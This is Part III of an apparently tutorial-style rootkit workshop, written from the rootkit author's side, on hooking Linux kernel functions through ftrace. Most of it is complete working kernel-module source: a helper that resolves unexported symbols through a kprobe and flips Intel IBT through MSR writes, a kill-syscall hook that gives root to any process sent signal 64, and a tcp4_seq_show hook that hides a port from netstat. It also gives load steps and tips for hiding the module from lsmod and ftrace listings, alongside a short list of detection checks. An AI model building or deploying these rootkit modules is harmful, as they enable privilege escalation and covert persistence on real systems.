 _____ _____ ____      _    ____ _____ 
|  ___|_   _|  _ \    / \  / ___| ____|
| |_    | | | |_) |  / _ \| |   |  _| 
|  _|   | | |  _ <  / ___ \ |___| |___ 
|_|     |_| |_| \_\/_/   \_\____|_____|
                                        
 _   _  ___   ___  _  _____ _   _  ____ 
| | | |/ _ \ / _ \| |/ /_ _| \ | |/ ___|
| |_| | | | | | | | ' / | ||  \| | |  _ 
|  _  | |_| | |_| | . \ | || |\  | |_| |
|_| |_|\___/ \___/|_|\_\___|_| \_|\____|

================================================================================
                         PART III: FTRACE HOOKING
================================================================================


----[ Introduction - Kernel Function Tracing ]--------------------------------

Ftrace is the Linux kernel's built-in tracing infrastructure. While it was 
designed for debugging (tracing function calls, latency, and performance), 
we rootkit authors abuse it to hook kernel functions dynamically.

In the previous module, we hijacked the PLT/GOT or used LD_PRELOAD.
Those techniques are limited to specific processes.
Here, in Ring 0, we change the rules.

WHY FTRACE REPLACED SYSCALL TABLE HOOKING:
    
    1. OLD WAY (Syscall Table): 
       We used to overwrite the `sys_call_table` array.
       Protection: The table is now Read-Only (RO).
       Protection: KASLR makes finding the table hard.
       
    2. NEW WAY (Ftrace):
       We ask the kernel to "trace" a function.
       The kernel handles the memory modification for us.
       It works on almost any function, not just syscalls.


----[ The Theory: How Ftrace Intercepts Execution ]---------------------------

To understand how we hijack control flow, I recommend you understand how 
the kernel compiles functions and how it modifies its own code at runtime.

1. THE COMPILER FLAG (-pg)
   When the kernel is compiled with FTRACE enabled (standard on most distros),
   GCC inserts a special instruction at the very start of every single function.
   On x86_64, this instruction is usually a call to `__fentry__`.

2. THE NOP SLED (Boot Time)
   Calling `__fentry__` for every function is slow. To fix this, at boot time,
   the kernel converts these calls into NOPs.
   
   The memory of a standard kernel function looks like this:

   [Kernel Function Start]
   0xffffffff81...  0F 1F 44 00 00    NOP (5 bytes) [ NOP DWORD ptr [eax + eax*1 + 0x00]
   0xffffffff81...  55                PUSH RBP
   0xffffffff81...  48 89 E5          MOV RBP, RSP
   ...

3. THE ACTIVATION (Hook Time)
   When we register an ftrace hook, the kernel (safely) overwrites that 5-byte
   NOP with a CALL instruction to the Ftrace trampoline.

   [Hooked Function]
   0xffffffff81...  E8 xx xx xx xx    CALL ftrace_caller
   0xffffffff81...  55                PUSH RBP
   ...

4. THE CALLBACK
   The `ftrace_caller` saves the CPU registers (arguments) and calls our
   registered callback function. We can then:
   - Read the registers (sniff data)
   - Change the registers (modify arguments)
   - Change the Instruction Pointer (redirect execution)


----[ The "Unexported Symbol" Hurdle ]----------------------------------------

In Userland, we used `dlsym` to find function addresses.
In Kernel, the equivalent is `kallsyms_lookup_name`.

THE PROBLEM:
Starting with Kernel 5.7, the developers stopped "exporting" 
`kallsyms_lookup_name`. This means your rootkit module cannot just call it to 
find other functions (like `sys_kill` or `tcp4_seq_show`). If you try, the 
module will fail to load with "Unknown symbol".

THE SOLUTION (The Kprobe Trick):
We can use "Kprobes" (another tracing feature we will detail in Part IV) to 
find the address of `kallsyms_lookup_name` itself.

    1. We declare a kprobe struct targeting "kallsyms_lookup_name".
    2. We register it.
    3. The kernel places the address of that symbol into our struct.
    4. We now have the address of the lookup function, and can find anything else.

Our `ftrace_helper.h` (below) implements this automatically.

----[ The Visual Flow ]-------------------------------------------------------

Ftrace uses the compiler's -pg flag which inserts mcount() or __fentry__()
calls at the beginning of every function. These become hooks for tracing.

COMPILATION PROCESS:

    Without ftrace:             With ftrace enabled:
    function_name:              function_name:
        push rbp                    call __fentry__     <-- Hook Point
        mov rbp, rsp                push rbp
        [function body]             mov rbp, rsp
                                    [function body]



FTRACE INFRASTRUCTURE:

                    NORMAL EXECUTION
                          |
                          v
                  [syscall invoked]
                          |
                          v
                  [kernel function]
                          |
                    +-----------+
                    |           |
                    v           |
            [__fentry__ call]   |
                    |           |
                    v           |
            [ftrace callback?]  | no callback
                    |           |
              yes   |           |
                    v           v
            [our hook]    [original function]
                    |           |
                    +-----------+
                          |
                          v
                    [execution continues]

THE NOP SLED (RUNTIME PATCHING):

To avoid performance hits, the kernel modifies code in memory at boot time and 
hook time.

    BOOT TIME:  call __fentry__  -->  NOP NOP NOP (No Operation)
    HOOK TIME:  NOP NOP NOP      -->  call ftrace_thunk (Our Rootkit)

----[ Development Environment ]-----------------------------------------------

Unlike userland, you need kernel headers to build modules.

REQUIRED TOOLS:
    
    sudo apt update
    sudo apt install build-essential linux-headers-$(uname -r)

WORKSPACE LAYOUT:

    /your_directory
      |-- ftrace_helper.h    (The abstraction layer)
      |-- hook_kill.c        (Privilege escalation example)
      |-- hide_port.c        (Port hiding example)
      |-- Makefile           (Build system)


----[ The Helper Header (ftrace_helper.h) ]-----------------------------------

To keep our code clean and focus on the attack logic, we use this header. 
It handles the resolution of `kallsyms_lookup_name` and defines the 
structures we need.

Create this file in your directory:


#ifndef FTRACE_HELPER_H
#define FTRACE_HELPER_H

#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/linkage.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

// ibt support bits
// goal: temporarily toggle ibt so certain hook flows work on ibt-enabled cpus
#define MSR_IA_S_CET        0x6a2
#define IBT_BIT_POSITION    2

static bool ibt_status = false;

// flip ibt on/off (best-effort)
static void ibt_toggle(void)
{
    u64 msr_value;

    if (!boot_cpu_has(X86_FEATURE_IBT))
    {
        return;
    }

    asm volatile ("rdmsr" : "=A"(msr_value) : "c"(MSR_IA_S_CET));
    msr_value ^= (1ULL << IBT_BIT_POSITION);
    asm volatile ("wrmsr" : : "c"(MSR_IA_S_CET), "A"(msr_value));
}

static bool ibt_is_on(void)
{
    u64 msr_value;

    if (!boot_cpu_has(X86_FEATURE_IBT))
    {
        return false;
    }

    asm volatile ("rdmsr" : "=A"(msr_value) : "c"(MSR_IA_S_CET));
    return test_bit(IBT_BIT_POSITION, (unsigned long *)&msr_value);
}

struct ftrace_hook
{
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

// kallsyms_lookup_name resolver via kprobe
// keeps the callsite simple for kernels that don't export it directly
static unsigned long (*kallsyms_lookup_name_ptr)(const char *name);
static struct kprobe kp =
{
    .symbol_name = "kallsyms_lookup_name",
};

static int resolve_kallsyms(void)
{
    if (kallsyms_lookup_name_ptr)
    {
        return 0;
    }

    register_kprobe(&kp);
    kallsyms_lookup_name_ptr = (void *)kp.addr;
    unregister_kprobe(&kp);

    if (!kallsyms_lookup_name_ptr)
    {
        return -1;
    }

    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip,
                                    unsigned long parent_ip,
                                    struct ftrace_ops *ops,
                                    struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    // recursion guard: don't hook if we're already executing inside this module
    if (!within_module(parent_ip, THIS_MODULE))
    {
        regs->ip = (unsigned long)hook->function;
    }
}

static int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    // disable ibt if it's currently on
    ibt_status = ibt_is_on();
    if (ibt_status)
    {
        ibt_toggle();
    }

    if (resolve_kallsyms() < 0)
    {
        if (ibt_status)
        {
            ibt_toggle();
        }
        return -EFAULT;
    }

    for (i = 0; i < count; i++)
    {
        hooks[i].address = kallsyms_lookup_name_ptr(hooks[i].name);
        if (!hooks[i].address)
        {
            printk(KERN_ERR "rootkit: unresolved symbol: %s\n", hooks[i].name);
            continue;
        }

        // stash the real address into the caller-provided "original" slot
        *((unsigned long *)hooks[i].original) = hooks[i].address;

        hooks[i].ops.func  = fh_ftrace_thunk;
        hooks[i].ops.flags = FTRACE_OPS_FL_SAVE_REGS |
                             FTRACE_OPS_FL_RECURSION |
                             FTRACE_OPS_FL_IPMODIFY;

        err = ftrace_set_filter_ip(&hooks[i].ops, hooks[i].address, 0, 0);
        if (err)
        {
            printk(KERN_ERR "rootkit: ftrace_set_filter_ip failed: %d\n", err);
        }

        err = register_ftrace_function(&hooks[i].ops);
        if (err)
        {
            printk(KERN_ERR "rootkit: register_ftrace_function failed: %d\n", err);
        }
    }

    // re-enable ibt if we disabled it
    if (ibt_status)
    {
        ibt_toggle();
    }

    return 0;
}

static void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    // match install behavior: toggle ibt the same way on entry/exit
    if (ibt_status)
    {
        ibt_toggle();
    }

    for (i = 0; i < count; i++)
    {
        unregister_ftrace_function(&hooks[i].ops);
        ftrace_set_filter_ip(&hooks[i].ops, hooks[i].address, 1, 0);
    }

    if (ibt_status)
    {
        ibt_toggle();
    }
}

#define HOOK(_name, _function, _original) \
{                                        \
    .name     = (_name),                 \
    .function = (_function),             \
    .original = (_original),             \
}

#endif

  ____  ___  ____  _____   _______  __    _    __  __ ____  _     _____ ____ 
 / ___|/ _ \|  _ \| ____| | ____\ \/ /   / \  |  \/  |  _ \| |   | ____/ ___| 
| |   | | | | | | |  _|   |  _|  \  /   / _ \ | |\/| | |_) | |   |  _| \___ \ 
| |___| |_| | |_| | |___  | |___ /  \  / ___ \| |  | |  __/| |___| |___ ___) |
 \____|\___/|____/|_____| |_____/_/\_\/_/   \_\_|  |_|_|   |_____|_____|____/ 


----[ Walkthrough 1: Privilege Escalation (The Kill Hook) ]-------------------

This is the "Hello World" of kernel object rootkits. We hook the `kill` system call.
Normally, `kill` sends a signal to a process. We will modify it so that if
we send signal 64, it grants root privileges to the target PID.

TARGET: __x64_sys_kill (The syscall handler for kill on 64-bit systems)

THE CHALLENGE (Atomic Contexts):
Ftrace hooks run in an "Atomic Context" (interrupts disabled). We cannot sleep
or allocate heavy memory here. However, changing credentials (`prepare_creds`)
might sleep. If we do this directly in the hook, the kernel crashes.

THE SOLUTION (Workqueues):
1. The Hook intercepts the signal.
2. It saves the Target PID and schedules a "Job" (Workqueue).
3. The Kernel runs our Job later in a safe thread (Process Context).
4. The Job finds the PID and grants root.

LOGIC:
   [Hook]
   IF signal == 64:
      Save Target PID
      Schedule Work
      Return 0 (Fake Success)

   [Worker Thread]
      Find Task by PID
      Prepare Root Credentials
      Commit Credentials to Task

Create `hook_kill.c`:

#include <linux/cred.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/syscalls.h>
#include <linux/workqueue.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xtengu");
MODULE_DESCRIPTION("rootkit demo");

static struct work_struct root_work;
static pid_t target_pid = 0;

static asmlinkage long (*orig_kill)(const struct pt_regs *);

static void execute_privesc(struct work_struct *work)
{
    struct task_struct *task;
    struct cred *new_creds;

    (void)work;

    if (target_pid == 0)
    {
        return;
    }

    printk(KERN_INFO "rootkit: worker searching for pid %d...\n", target_pid);

    // 1) find the target pid
    rcu_read_lock();
    for_each_process(task)
    {
        if (task->pid != target_pid)
        {
            continue;
        }

        get_task_struct(task);
        rcu_read_unlock();

        printk(KERN_INFO "rootkit: found task %s (pid %d)\n", task->comm, task->pid);

        // 2) alternate method: clone 'current' (worker) instead of 'init'
        // since this runs in a kworker, 'current' is already root
        new_creds = prepare_creds();
        if (!new_creds)
        {
            printk(KERN_ERR "rootkit: prepare_creds() failed\n");
            put_task_struct(task);
            return;
        }

        // 3) zero out creds to ensure root
        new_creds->uid.val   = 0;
        new_creds->gid.val   = 0;
        new_creds->euid.val  = 0;
        new_creds->egid.val  = 0;
        new_creds->suid.val  = 0;
        new_creds->sgid.val  = 0;
        new_creds->fsuid.val = 0;
        new_creds->fsgid.val = 0;

        // 4) apply to the target
        rcu_assign_pointer(task->real_cred, new_creds);
        rcu_assign_pointer(task->cred, new_creds);

        printk(KERN_INFO "rootkit: privesc successful for pid %d\n", task->pid);

        put_task_struct(task);
        target_pid = 0;
        return;
    }
    rcu_read_unlock();

    printk(KERN_ERR "rootkit: failed to find pid %d\n", target_pid);
    target_pid = 0;
}

static asmlinkage int hook_kill(const struct pt_regs *regs)
{
    int signal = regs->si;
    pid_t pid_arg = regs->di;

    // ignore signal 0 to keep logs clean
    if (signal == 0)
    {
        return orig_kill(regs);
    }

    if (signal == 64)
    {
        printk(KERN_INFO "rootkit: intercepted signal 64 for pid %d\n", pid_arg);
        target_pid = pid_arg;
        schedule_work(&root_work);
        return 0;
    }

    return orig_kill(regs);
}

static struct ftrace_hook hooks[] =
{
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int __init rootkit_init(void)
{
    INIT_WORK(&root_work, execute_privesc);
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    cancel_work_sync(&root_work);
}

module_init(rootkit_init);
module_exit(rootkit_exit);


----[ The Makefile ]----------------------------------------------------------

Kernel modules require a specific build syntax.
obj-m for this workshop is either hook_kill.o or hide_port.o

obj-m += hook_kill.o 

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean


----[ Testing Walkthrough ]---------------------------------------------------

1.  COMPILE:
    $ make

2.  LOAD (Requires sudo):
    $ sudo insmod hook_kill.ko

3.  VERIFY USER:
    $ id
    uid=1000(user) gid=1000(user) ...

4.  TRIGGER EXPLOIT:
    Send signal 64 to any process ($$ = shell).
    $ kill -64 $$

5.  VERIFY ROOT:
    $ id
    uid=0(root) gid=0(root) ...
    $ whoami
    root


----[ Walkthrough 2: Port Hiding (tcp4_seq_show) ]----------------------------

Hiding files or ports involves hooking the functions that "list" them.
Legacy tools like `netstat` read from the file `/proc/net/tcp`.
The kernel function that generates this file content is `tcp4_seq_show`.

IMPORTANT NOTE ON TOOLS:
   - `netstat`: Reads /proc/net/tcp. THIS HOOK WORKS.
   - `ss`: Uses the Netlink API (inet_diag). THIS HOOK WILL FAIL.
   
   This demonstrates that rootkits must target specific subsystems. To hide 
   from `ss`, we would need to hook `inet_dump_ifaddr` or Netlink handlers.

LOGIC:
   1. Hook tcp4_seq_show
   2. Check the port of the socket being printed
   3. IF port == 8081:
         Return 0 (Success) immediately
         (This prevents the original function from printing the line)
   4. ELSE:
         Call original function

Create `hide_port.c`:

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/tcp.h>
#include <linux/seq_file.h> // required for seq_start_token
#include <net/sock.h>       // required for struct sock and sk_num
#include "ftrace_helper.h"

#define HIDE_PORT 8081

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xtengu");
MODULE_DESCRIPTION("Port Hiding Module");

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;

    // check if this is the "header" line or a real socket
    if (v != SEQ_START_TOKEN) 
    {
        // sk_num is stored in host byte order, so 8081 works directly
        if (sk->sk_num == HIDE_PORT) 
        {
            printk(KERN_INFO "rootkit: hiding port %d\n", HIDE_PORT);
            return 0;
        }
    }

    return orig_tcp4_seq_show(seq, v);
}

static struct ftrace_hook hooks[] = 
{
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

static int __init rootkit_init(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rootkit_init);
module_exit(rootkit_exit);

----[ Testing Walkthrough ]---------------------------------------------------

1.  COMPILE:
    $ make

2.  Listen on port 8081
    nc -nvlp 8081

3.  Verify Visibility
    netstat -ant | grep 8081

4.  Load rootkit
    sudo insmod hide_port.ko

5.  Check with netstat 
    netstat -ant | grep 8081

6.  Check kernel logs to confirm hook fired
    sudo dmesg | tail

7.  ss -ant | grep 8081



----[ Note: Recursion & Stability ]---------------------------------------

Writing kernel code is dangerous. A mistake doesn't segfault the app; it 
panics the OS.

1. SLEEPING IN ATOMIC CONTEXT (The #1 Crash Cause)
   Ftrace hooks execute in an "Atomic" or "Interrupt" context. 
   You CANNOT call functions that might sleep (wait) for I/O or memory.
   
   - BAD:  kmalloc(..., GFP_KERNEL), prepare_creds()
   - GOOD: kmalloc(..., GFP_ATOMIC), schedule_work()

   If you need to do heavy lifting (like changing credentials), use a 
   Workqueue to offload the task to a process context.

2. RECURSION
   If you hook `printk` and then call `printk` inside your hook, the kernel 
   enters an infinite loop and crashes.
   
   Defense:
   - Check `within_module(parent_ip, THIS_MODULE)` in the trampoline.
   - Use `ftrace_function_recursion` checks.

3. INDIRECT BRANCH TRACKING (IBT)
   On Intel Tiger Lake (11th Gen) and newer, the CPU enforces "Control-Flow 
   Integrity." Jumping to a function that doesn't start with `ENDBR64` triggers 
   a fault.
   
   Standard ftrace is usually safe, but manual trampoline manipulation can 
   trigger this. Our `ftrace_helper.h` manually toggles IBT off during hook 
   installation to ensure compatibility with modern kernels (5.8+).


----[ Detection & Persistence ]-----------------------------------------------

Once your rootkit is loaded, it is vulnerable to detection.

1. LSMOD
   Your module shows up in `lsmod`.
   
   TECHNIQUE: Module List Unlinking
   You can remove your module from the global linked list of modules.
   
   void hide_module(void) 
   {
       list_del(&THIS_MODULE->list);
       // Also remove from kobject list and sysfs...
   }

2. FTRACE ENABLED_FUNCTIONS
   The file `/sys/kernel/tracing/enabled_functions` lists every function 
   currently being hooked by ftrace.

   $ sudo cat /sys/kernel/tracing/enabled_functions
   bpf_lsm_file_open (1) R D M   tramp: ftrace_regs_caller...
   tcp4_seq_show (1) R I M       tramp: ... (fh_ftrace_thunk+0x0/0x210 [hide_port])

   Note that valid system tools (like BPF security modules) also appear here!
   However, seeing `[hide_port]` explicitly names the malicious module.

   Defense: You would need to hook `sys_read` or the specific file operations
   for the tracefs filesystem to hide these entries.

   Defense: You would need to hook `sys_read` or the specific file operations
   for the tracefs filesystem to hide these entries.

3. TAINTED KERNEL
   Loading an unsigned module sets the "Taint" flag.
   
   $ cat /proc/sys/kernel/tainted
   
   A value of '0' is clean. Anything else implies non-standard modules are 
   loaded. Admins look for this.

$ cat /proc/sys/kernel/tainted
   12800
   
   A value of '0' is clean. 
   12800 decodes to: 
     - TAINT_OOT_MODULE (4096): Out-of-tree module
     - TAINT_UNSIGNED_MODULE (8192): Module not signed by distro key
     - TAINT_WARN (512): Kernel issued a warning
   
   Admins look for any non-zero value here.

  ____  _   _ __  __ __  __    _    ____  __   __
 / ___|| | | |  \/  |  \/  |  / \  |  _ \ \ \ / /
 \___ \| | | | |\/| | |\/| | / _ \ | |_) | \ V / 
  ___) | |_| | |  | | |  | |/ ___ \|  _ <   | |  
 |____/ \___/|_|  |_|_|  |_/_/   \_\_| \_\  |_|  


----[ Summary: Ftrace Techniques ]--------------------------------------------

WHAT YOU LEARNED:

    Ftrace Hooking        - Intercepting function calls via tracing API
    Kernel Modules (LKM)  - Loading code into Ring 0
    Runtime Patching      - How the kernel modifies assembly dynamically
    Kallsyms Lookup       - Bypassing unexported symbol restrictions
    IBT Bypassing         - Handling Indirect Branch Tracking hardware

KEY CONCEPTS:

    Moving from Userland (Ring 3) back to Kernel (Ring 0)
    The difference between syscall table hacking and Ftrace
    Why we need helper libraries for modern kernels (5.7+)
    Recursion dangers in kernel mode

TECHNIQUE COMPARISON:

    Syscall Table Hijacking (Old School):
        + Conceptually simple (just an array of pointers)
        - Table is Read-Only (CR0 register manipulation needed)
        - Race conditions are common
        - Highly unstable on modern kernels
        
    Ftrace Hooking (Modern):
        + Uses legitimate kernel API
        + Race-free and SMP safe
        + Can hook almost any kernel function, not just syscalls
        + Works with KASLR enabled
        - Leaves visible traces in debugfs
        - Requires specialized setup for IBT (Intel CET)

DETECTION METHODS:

    For Ftrace Hooks:
        Check /sys/kernel/tracing/enabled_functions
        Check /sys/kernel/tracing/touched_functions
        
    For Kernel Modules:
        Check 'lsmod' output
        Check /sys/module/ directory
        Check /proc/modules
        
    General Indicators:
        Check /proc/sys/kernel/tainted (Value > 0 is suspicious)
        Analyze dmesg logs for "loading out-of-tree module"
        Compare /proc/net/tcp against external network scans

YOU ARE NOW READY:

    [✓] Understand the Ftrace infrastructure
    [✓] Can build and load Kernel Modules
    [✓] Know how to resolve unexported kernel symbols
    [✓] Can implement Privilege Escalation (Hooking sys_kill)
    [✓] Can implement Port Hiding (Hooking tcp4_seq_show)

Next we move to KPROBES, which offers even higher granularity. While Ftrace 
hooks the *entry* of a function, Kprobes can hook *any instruction* in memory.

            ▐             
            ▜▀ ▞▀▖▛▀▖▞▀▌▌ ▌
            ▐ ▖▛▀ ▌ ▌▚▄▌▌ ▌
             ▀ ▝▀▘▘ ▘▗▄▘▝▀▘
                  
                   ONWARDS TO
                PART IV: HOOKING
                    KPROBES

.EOF
